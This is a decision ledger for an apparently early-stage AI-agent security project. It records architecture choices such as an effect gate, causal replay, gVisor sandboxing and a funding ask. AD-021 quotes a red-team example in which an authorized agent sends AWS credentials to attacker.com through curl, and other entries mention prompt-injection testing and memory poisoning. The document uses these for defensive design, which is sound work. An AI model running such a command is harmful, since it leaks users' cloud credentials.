# Research Decision Ledger V2 (Living Systems Governance)

**Project Name:** GIBBRN  
**Document Track:** Historical Architecture Decision Records (ADRs) — Version 2  
**Governance Rule:** Never overwrite historical decisions. Record the continuous evolution of systems hypotheses based on empirical research and adversarial diligence audits.  
**Allowed Verdicts:** `KEEP` | `MODIFY` | `MERGE` | `DEFER` | `KILL`  

---

## Complete Decision Record Index

### Section 1: Historical Decisions (V1 Formulation — September 1–3, 2026)
*   [AD-001: Broad "Adaptive Agent Runtime" vs. "State Integrity Layer" (MODIFY)](#ad-001-broad-adaptive-agent-runtime-vs-state-integrity-layer)
*   [AD-002: Deployment-Time Model Weight Fine-Tuning (DEFER)](#ad-002-deployment-time-model-weight-fine-tuning)
*   [AD-003: Bespoke Distributed Database & Consensus Protocol (KILL)](#ad-003-bespoke-distributed-database--consensus-protocol)
*   [AD-004: In-Context Verbal Self-Reflection for Memory Promotion (KILL)](#ad-004-in-context-verbal-self-reflection-for-memory-promotion)
*   [AD-005: Four-Tier Typed State Decomposition Taxonomy (KEEP)](#ad-005-four-tier-typed-state-decomposition-taxonomy)
*   [AD-006: Merkle-Causal Flight Recorder with Bounded Replay (KEEP)](#ad-006-merkle-causal-flight-recorder-with-bounded-replay)
*   [AD-007: Deterministic Authority Reducer & Pre-Execution Effect Gate (KEEP)](#ad-007-deterministic-authority-reducer--pre-execution-effect-gate)
*   [AD-008: Automated Micro-Sandbox Regression Suite for Experience Admission (KEEP)](#ad-008-automated-micro-sandbox-regression-suite-for-experience-admission)
*   [AD-009: Lifetime-Scoped Persistent Risk Ledger Across Trajectories (KEEP)](#ad-009-lifetime-scoped-persistent-risk-ledger-across-trajectories)
*   [AD-010: LLM-as-a-Judge for Root Privilege Evaluation (KILL)](#ad-010-llm-as-a-judge-for-root-privilege-evaluation)
*   [AD-011: Framework-Neutral State Projection Adapter Layer (KEEP)](#ad-011-framework-neutral-state-projection-adapter-layer)

### Section 2: Post-Diligence Decisions (V2 Reconstruction — September 3, 2026)
*   [AD-012: Consolidation of Five Conceptual Subsystems into Three Physical Engines (MERGE)](#ad-012-consolidation-of-five-subsystems-into-three-physical-engines)
*   [AD-013: Integration of Flight Recorder into the Causal State Spine (MERGE)](#ad-013-integration-of-flight-recorder-into-the-causal-state-spine)
*   [AD-014: Integration of Authority Plane into the Deterministic Effect Gate (MERGE)](#ad-014-integration-of-authority-plane-into-the-deterministic-effect-gate)
*   [AD-015: Demarcation of Hermetic Replay vs. Open-World Causal Audit (MODIFY)](#ad-015-demarcation-of-hermetic-replay-vs-open-world-causal-audit)
*   [AD-016: Replacement of Geometric Error Compounding with Survival Analysis (MODIFY)](#ad-016-replacement-of-geometric-error-compounding-with-survival-analysis)
*   [AD-017: Pruning of Eight Research Questions to Five Causally Chained Core RQs (MODIFY)](#ad-017-pruning-of-eight-research-questions-to-five-causally-chained-core-rqs)
*   [AD-018: Narrowing Experience Admission to Verifier-Rich Execution Domains (MODIFY)](#ad-018-narrowing-experience-admission-to-verifier-rich-execution-domains)
*   [AD-019: Elevation of the $285,000 Budget as Primary Pre-Seed Ask (MODIFY)](#ad-019-elevation-of-the-285000-budget-as-primary-pre-seed-ask)
*   [AD-020: Elevation of the Deterministic Effect Gate as Initial Technical Wedge (KEEP & EXPAND)](#ad-020-elevation-of-the-deterministic-effect-gate-as-initial-technical-wedge)
*   [AD-021: OS-Level Kernel Sandboxing (gVisor) to Block Parameter Smuggling (KEEP & EXPAND)](#ad-021-os-level-kernel-sandboxing-gvisor-to-block-parameter-smuggling)

---

## Section 1: Historical Decisions (Preserved from V1)

*(Records AD-001 through AD-011 preserved intact from initial research phase, documenting the initial shift away from broad runtime frameworks and distributed databases to state integrity).*

---

## Section 2: Post-Diligence Decisions (V2 Reconstruction)

### AD-012: Consolidation of Five Subsystems into Three Physical Engines
*   **Date:** September 3, 2026
*   **Question:** Should gibbrn maintain five distinct architectural subsystems during an 18-month pre-seed R&D program?
*   **Evidence Examined:** `AUDIT_05` architectural red-team analysis and subsystem boundary overlap.
*   **Supporting Evidence:** Five subsystems introduce inter-process latency, duplicate serialization to PostgreSQL WAL, and confuse early-stage investors.
*   **Contradictory Evidence:** Five concepts remain useful for modular theoretical design.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MERGE**
*   **Confidence:** 95%
*   **What Changed:** Re-architected implementation into three physical engines: (1) Causal State Spine, (2) Deterministic Effect Gate, and (3) Experience Admission Engine.
*   **Next Experiment:** Latency benchmarking at Gate M3.

---

### AD-013: Integration of Flight Recorder into the Causal State Spine
*   **Date:** September 3, 2026
*   **Question:** Does the Flight Recorder require a separate subsystem from the State Spine?
*   **Evidence Examined:** Dataflow diagrams and event schema specifications in `04_SYSTEM_ARCHITECTURE.md`.
*   **Supporting Evidence:** Both the State Spine and the Flight Recorder write append-only events to the same PostgreSQL database. Separating them creates duplicate writes.
*   **Contradictory Evidence:** Flight recording includes high-volume tool receipts that could bloat state queries.
*   **Evidence Strength:** `ESTABLISHED`
*   **Decision:** **MERGE**
*   **Confidence:** 98%
*   **What Changed:** Flight recording is formally designated as the event log implementation of Engine 1 (Causal State Spine).
*   **Next Experiment:** Gate M6 causal reconstruction benchmarks on AgentErrorBench.

---

### AD-014: Integration of Authority Plane into the Deterministic Effect Gate
*   **Date:** September 3, 2026
*   **Question:** Should the Authority Reducer and the Effect Gate exist as separate services?
*   **Evidence Examined:** TOCTOU race condition analysis in `AUDIT_05`.
*   **Supporting Evidence:** A network hop between an authority service and an enforcement proxy creates a Time-Of-Check to Time-Of-Use race window. Merging them allows single-use atomic capability leases.
*   **Contradictory Evidence:** Separating policy evaluation from enforcement is standard in large enterprise systems.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MERGE**
*   **Confidence:** 94%
*   **What Changed:** The Authority Reducer and Effect Gate are unified into Engine 2 as an out-of-process daemon with shared in-memory atomic state.
*   **Next Experiment:** Gate M9 red-teaming across 1,000 prompt injection attacks.

---

### AD-015: Demarcation of Hermetic Replay vs. Open-World Causal Audit
*   **Date:** September 3, 2026
*   **Question:** Can gibbrn promise deterministic bit-for-bit causal replay across external web and cloud APIs?
*   **Evidence Examined:** Systems engineering analysis of environment entropy in `AUDIT_05`.
*   **Supporting Evidence:** External REST APIs return dynamic timestamps, nonces, and mutating database rows that break live replay.
*   **Contradictory Evidence:** Hermetic local container environments can be snapshotted deterministically.
*   **Evidence Strength:** `ESTABLISHED`
*   **Decision:** **MODIFY**
*   **Confidence:** 99%
*   **What Changed:** Split replay into: (1) **Hermetic Replay** (guaranteed only in sealed local Docker/gVisor containers) and (2) **Open-World Causal Audit** (divergence localization on mutable web systems).
*   **Next Experiment:** Gate M6 benchmark distinguishing hermetic vs. open divergence rates.

---

### AD-016: Replacement of Geometric Error Compounding with Survival Analysis
*   **Date:** September 3, 2026
*   **Question:** Is $P = p^d$ a scientifically defensible model for multi-step agent trajectories?
*   **Evidence Examined:** Statistical review in `AUDIT_06`; AgentErrorBench Markovian failure data.
*   **Supporting Evidence:** Step errors in agents are strongly autocorrelated; agents employ retries and alternative tool paths; geometric decay assumes memoryless coin flips.
*   **Contradictory Evidence:** Geometric decay is widely cited in popular AI blog posts as an intuitive toy illustration.
*   **Evidence Strength:** `ESTABLISHED (STATISTICAL)`
*   **Decision:** **MODIFY**
*   **Confidence:** 100%
*   **What Changed:** Formally adopted discrete survival analysis: $S(k) = \prod_{i=1}^k (1 - h(i))$, defining $\text{MDDD}_\tau$ as an empirical Kaplan-Meier quantile.
*   **Next Experiment:** Gate M15 Log-Rank survival curve analysis.

---

### AD-017: Pruning of Eight Research Questions to Five Causally Chained Core RQs
*   **Date:** September 3, 2026
*   **Question:** Should an 18-month pre-seed research program attempt to answer eight broad research questions?
*   **Evidence Examined:** Critical path and scheduling analysis in `AUDIT_07`.
*   **Supporting Evidence:** Eight RQs spread a two-person team across peripheral LoRA fine-tuning and cross-runtime benchmarks, risking failure on the core thesis.
*   **Contradictory Evidence:** More RQs demonstrate broad ambition to investors.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 92%
*   **What Changed:** Pruned to five causally chained Core RQs (Classification $\to$ Reconstruction $\to$ Authority $\to$ Admission $\to$ Survival). Secondary tracks deferred to non-binding exploratory status.
*   **Next Experiment:** Core RQ1 benchmark execution in Months 1–3.

---

### AD-018: Narrowing Experience Admission to Verifier-Rich Execution Domains
*   **Date:** September 3, 2026
*   **Question:** Can gibbrn build an automated experience admission system for general open-ended agent skills within 18 months?
*   **Evidence Examined:** Complexity of general automated program synthesis and regression evaluation in `AUDIT_07`.
*   **Supporting Evidence:** General skill induction requires complex semantic verification that consumes massive token spend.
*   **Contradictory Evidence:** Enterprises want agents that learn broad conversational procedures.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 90%
*   **What Changed:** Engine 3 is narrowed strictly to **verifier-rich domains**: deterministic Python functions and Bash tool macros inside gVisor sandboxes with automated test suites.
*   **Next Experiment:** Gate M12 regression evaluation under MINJA poisoning.

---

### AD-019: Elevation of the $285,000 Budget as Primary Pre-Seed Ask
*   **Date:** September 3, 2026
*   **Question:** Should gibbrn present $120,000 and $285,000 as equal funding options to 1517 Fund?
*   **Evidence Examined:** Single-point-of-failure analysis and token compute recalculations in `AUDIT_07` and `AUDIT_08`.
*   **Supporting Evidence:** \$120,000 forces a solo founder into extreme financial precarity, eliminates engineering support, and cuts benchmark volume by 70%. \$285,000 is scientifically credible and sits squarely in 1517's pre-seed check range.
*   **Contradictory Evidence:** Lower ask numbers appear more capital-efficient to non-technical investors.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 95%
*   **What Changed:** Established \$285,000 as the primary pre-seed ask. \$120,000 is retained strictly as an extreme contingency fallback.
*   **Next Experiment:** 1517 Fund Investment Committee diligence submission.

---

### AD-020: Elevation of the Deterministic Effect Gate as Initial Technical Wedge
*   **Date:** September 3, 2026
*   **Question:** What is the sharpest, immediate commercial wedge of gibbrn?
*   **Evidence Examined:** Enterprise security demand for agent guardrails; vulnerability of LangGraph state dicts.
*   **Supporting Evidence:** Full state integrity and causal replay require multi-month R&D. Enterprise teams immediately need an out-of-process gate stopping agents from laundering authority or executing out-of-scope mutations.
*   **Contradictory Evidence:** Focus on security alone risks reducing gibbrn to an AI security gateway.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **KEEP & EXPAND**
*   **Confidence:** 92%
*   **What Changed:** Formally declared the Deterministic Effect Gate as the initial technical wedge of the 18-month research program.
*   **Next Experiment:** Core RQ3 benchmark evaluation at Gate M9.

---

### AD-021: OS-Level Kernel Sandboxing (gVisor) to Block Parameter Smuggling
*   **Date:** September 3, 2026
*   **Question:** Does capability token validation at the Effect Gate prevent all malicious tool actions?
*   **Evidence Examined:** Parameter-level payload smuggling red-team attack (ADV-01) in `AUDIT_05`.
*   **Supporting Evidence:** An agent authorized to execute `bash` can still run `curl http://attacker.com?leak=$(cat ~/.aws/credentials)`. Capability tokens check tool identity, not parameter safety.
*   **Contradictory Evidence:** Running micro-sandboxes adds container startup latency.
*   **Evidence Strength:** `ESTABLISHED`
*   **Decision:** **KEEP & EXPAND**
*   **Confidence:** 98%
*   **What Changed:** Engine 2 couples capability evaluation with ephemeral **gVisor micro-containers** featuring strict network namespace isolation and unmapped host credential directories.
*   **Next Experiment:** Latency profiling of warm gVisor container reuse at Gate M3.
